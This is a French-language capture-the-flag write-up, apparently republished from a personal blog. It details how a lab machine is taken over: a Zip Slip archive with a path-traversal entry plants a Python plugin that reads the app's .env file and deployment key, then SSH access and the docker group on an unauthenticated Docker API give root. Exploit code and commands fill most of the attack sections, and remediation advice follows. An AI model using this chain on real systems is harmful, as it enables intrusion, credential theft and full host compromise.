# ANcy — un Zip Slip dans les plugins, puis le groupe docker pour finir

> 📖 **Public write-up by [alwil17](https://github.com/Alwil17)** — originally published at <https://alwil17.github.io/ctf-writeups/posts/ancy/>  
> Source: <https://github.com/Alwil17/ctf-writeups> · MIT License, © 2026 alwil17 (see `THIRD_PARTY_LICENSES/alwil17-ctf-writeups.LICENSE`). Front matter removed, article body unmodified.

> **TL;DR** — L'appli accepte un plugin sous forme d'archive ZIP et l'extrait
> sans vérifier les chemins. Je glisse une entrée `../../app/plugins/pwn.py` : le
> worker la charge et exécute mon code en `www-data`. Je lis le `.env` et la clé
> de déploiement, je me connecte en SSH comme `deploy`… qui est dans le groupe
> `docker`. À partir de là, l'API Docker locale me donne la machine hôte entière
> via un conteneur monté sur `/`. **Flag :** `/root/root.txt` → `NCTF{…}`.

## 1. Briefing

Un boot2root de la finale. Un seul flag, dans `/root/root.txt` en `chmod 600`.
Le portail web gère des « plugins » qu'on téléverse — et quand une appli extrait
une archive que je fournis, je pense tout de suite Zip Slip.

| Champ | Valeur |
|-------|--------|
| Cible | lab éphémère — web, SSH, API Docker |
| Chaîne | upload de plugin ZIP |
| Flag | `NCTF{...}` |

## 2. Reconnaissance

```bash
curl -s http://<ip>/api/version     # empreinte de l'appli
```

Il y a aussi six services sur des ports hauts (`3000`, `4848`, `5601`, `8082`,
`9090`, `8888`). Ils répondent, mais après quelques minutes dessus : que du
décor. Le vrai chemin passe par `/upload`.

## 3. Analyse

Le endpoint `/upload` prend une archive et l'extrait dans le dossier des
plugins, puis un worker charge chaque `.py` trouvé. Rien ne normalise les noms
d'entrées de l'archive : une entrée comme `../../app/plugins/pwn.py` sort du
dossier d'extraction et écrit où je veux. C'est un Zip Slip classique, et comme
la cible est un dossier de plugins Python, mon fichier devient directement du
code exécuté.

## 4. Exploitation

### Étape 1 — fabriquer l'archive Zip Slip

```python
import io, zipfile, json, requests

plugin = (
    "import os\n"
    "open('/opt/app/plugins/leak.txt','w').write(\n"
    "    os.popen('cat /opt/app/.env; cat /opt/app/deploy_key.b64').read())\n"
)
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w") as z:
    z.writestr("../../app/plugins/pwn.py", plugin)   # l'entrée qui s'évade
```

### Étape 2 — téléverser et déclencher le worker

```python
requests.post("http://<ip>/upload", data=buf.getvalue(),
              headers={"Content-Type": "application/json"})
requests.post("http://<ip>/api/worker/tick", data=b"{}")   # charge les plugins
```

Le worker importe `pwn.py` en `www-data` et exécute mon code. Je récupère le
`leak.txt` déposé : il contient le `.env` **et** la clé de déploiement encodée
en base64.

### Étape 3 — décoder la clé et se connecter en deploy

```bash
base64 -d deploy_key.b64 > deploy_key
chmod 600 deploy_key
ssh -i deploy_key deploy@<ip>
```

### Étape 4 — deploy → root via le groupe docker

```bash
id            # ... groups=...,999(docker)
```

`deploy` est dans le groupe `docker`, et l'API Docker écoute en local sur
`127.0.0.1:2375`. Le groupe docker, c'est root : je crée un conteneur qui monte
la racine de l'hôte, je le démarre, et je lis le flag à travers le montage.

```bash
# créer un conteneur qui monte / de l'hôte dans /host
curl -s --unix-socket /dev/null http://127.0.0.1:2375/containers/create \
  -H 'Content-Type: application/json' -d '{
    "Image": "alpine",
    "Cmd": ["cat", "/host/root/root.txt"],
    "HostConfig": {"Binds": ["/:/host"]}
  }'
# démarrer puis lire les logs du conteneur
curl -s -XPOST http://127.0.0.1:2375/containers/<id>/start
curl -s http://127.0.0.1:2375/containers/<id>/logs?stdout=1
```

## 5. Flag

```text
NCTF{…}
```

(Le flag n'existe que dans `/root/root.txt` — tronqué ici selon la politique du
site.)

## 6. Impasses & leurres

- **Les six ports hauts** (`3000`, `4848`, `5601`, `8082`, `9090`, `8888`)
  répondent vraiment mais ne mènent nulle part. J'ai perdu du temps dessus avant
  de revenir à `/upload`.
- **Zip Slip qui ne « prend » pas.** Si la bibliothèque d'extraction nettoie le
  premier `..`, il faut parfois empiler les `../` ou viser un chemin absolu. Ici
  `../../app/plugins/pwn.py` suffit.
- **`docker` sans TLS.** L'API sur `2375` est en clair et sans auth : une fois
  `deploy` obtenu, l'escalade est immédiate.

## 7. Leçons & remédiation

- **Ne jamais faire confiance aux noms d'entrées d'archive.** Normaliser chaque
  chemin (`os.path.realpath`), rejeter tout ce qui sort du dossier cible, et ne
  pas exécuter ce qui vient d'être extrait.
- **Clés de déploiement hors de la racine web.** Une clé lisible par `www-data`
  est un pivot direct. La stocker ailleurs, propriété d'un compte dédié.
- **Le groupe `docker` = root.** Ne pas y mettre un compte de service, et ne
  jamais exposer l'API Docker sans TLS mutuel. Préférer un socket restreint et
  des règles d'autorisation.

## 8. Annexe — chaîne résumée

```text
ZIP(../../app/plugins/pwn.py) → /upload → /api/worker/tick
   → RCE www-data → .env + deploy_key.b64
   → ssh deploy (groupe docker) → API 2375 Binds ["/:/host"]
   → /root/root.txt
```
